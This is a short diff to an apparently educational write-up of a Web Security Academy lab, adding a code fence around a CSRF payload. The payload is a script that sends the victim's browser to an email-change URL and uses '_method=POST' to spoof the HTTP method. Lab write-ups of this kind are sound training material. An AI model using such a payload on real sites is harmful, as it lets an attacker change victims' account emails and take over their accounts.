@@ -10,6 +10,8 @@ This is where method spoofing comes into play — it allows us to simulate an HT
 
 The syntax depends on the framework; in this case, it is specified using _method=POST.
 
+```js
 <script>
     document.location = "<IP>/my-account/change-email?email=pwned@web-security-academy.net&_method=POST";
 </script>
+```
